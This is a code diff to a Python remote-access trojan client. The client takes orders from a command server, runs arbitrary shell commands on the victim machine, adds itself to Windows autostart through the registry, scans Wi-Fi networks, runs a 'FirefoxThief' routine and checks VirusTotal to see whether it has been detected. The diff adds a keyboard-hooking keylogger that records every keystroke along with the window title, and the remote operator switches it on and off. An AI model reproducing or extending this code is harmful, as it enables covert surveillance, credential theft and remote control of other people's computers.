@@ -1,5 +1,5 @@
 import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, simplejson, thread
-import inspect, urllib2, os.path, base64, getpass, urllib, time
+import inspect, urllib2, os.path, base64, getpass, urllib, time, pyHook, pythoncom
 from colored import fg, bg, attr
 from subprocess import Popen, PIPE, STDOUT
 from Crypto.Cipher import AES
@@ -31,8 +31,9 @@ class PKCS7Encoder():
 
 encoder = PKCS7Encoder()
 #host = 'hcjczulezpxxfw2n.onion'
-host = '192.168.0.101'
+host = '192.168.0.102'
 cType = "client000-crypto" #client Type
+global log1
 
 ######### virtus-total check
 VTurl = "https://www.virustotal.com/vtapi/v2/file/report"
@@ -77,6 +78,7 @@ def RecvData():
 # autostart for Windows
 def WindowsAutoStart():
     try:
+        #name = inspect.getfile(inspect.currentframe());
         regQuery = EXEC('reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "prova" /t REG_SZ')
         SendData(regQuery +'\n'+ "Does the key already exist? [y/n]")
         regDo = RecvData()
@@ -96,6 +98,64 @@ def ScanWIFI(card):
     for network in networks:
             SendData(network)
     SendData("ScanWIFI-finished")
+
+def OnKeyboardEvent(event):
+    if runHook == 1:
+        log1.write("WindowName:"+str(event.WindowName)+"||"+chr(event.Ascii)+"\n")
+    else:
+        pass
+    return True
+
+global HKthread
+global hookman
+hookman = pyHook.HookManager()
+HKthread = thread
+HKstat = "OFF"
+
+def WindowsHOOKER(threadName, running):
+    hookman.KeyDown = OnKeyboardEvent
+    hookman.HookKeyboard()
+    while runHook:
+        pythoncom.PumpWaitingMessages()
+        time.sleep(0.1)
+
+def WindowsHOOK(status,namefile):
+    global HKstat
+    if status == "check":
+        return HKstat
+    elif status == "ON":
+        if status == HKstat:
+            report = "Already running"
+            return report
+        else:
+            try:
+                global runHook
+                runHook = 1
+                HKthread.start_new_thread(WindowsHOOKER, ("HK-1",1))
+                global log1
+                log1 = open(namefile, 'w')
+                HKstat = "ON"
+                return HKstat
+            except:
+                HKstat = "Error: unable to start thread"
+                return HKstat
+    elif status == "OFF":
+        if status == HKstat:
+            report = "Already stopped"
+            return report
+        else:
+            try:
+                runHook = 0
+                time.sleep(0.1)
+                log1.close()
+                HKstat = "OFF"
+                return HKstat
+            except:
+                statReturn = "Something went wrong, HKstat= " + HKstat
+                return statReturn
+    else:
+        statReturn = "Something went wrong, HKstat= " + HKstat
+        return statReturn
 
 
 def RecvData():
@@ -278,6 +338,13 @@ while 1:
         SendData('ip:'+myIP)
         SendData(VTresponse)
         SendData("end-info")
+    elif inText.startswith("hook"):
+        if len(inText.split(':')) == 3:
+            hookstat = WindowsHOOK(inText.split(':')[1],inText.split(':')[2])
+            SendData(hookstat)
+        else:
+            hookstat = WindowsHOOK(inText.split(':')[1],"")
+            SendData(hookstat)
     elif inText.startswith("set"):
         if inText.split(":")[1]== "autostart":
             SendData(platform.system())
@@ -322,6 +389,7 @@ while 1:
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
     elif inText == "FirefoxThief":
+        #SendData("Error: function not supported")
         FirefoxThief()
     else:
         print '[inText] ' + inText
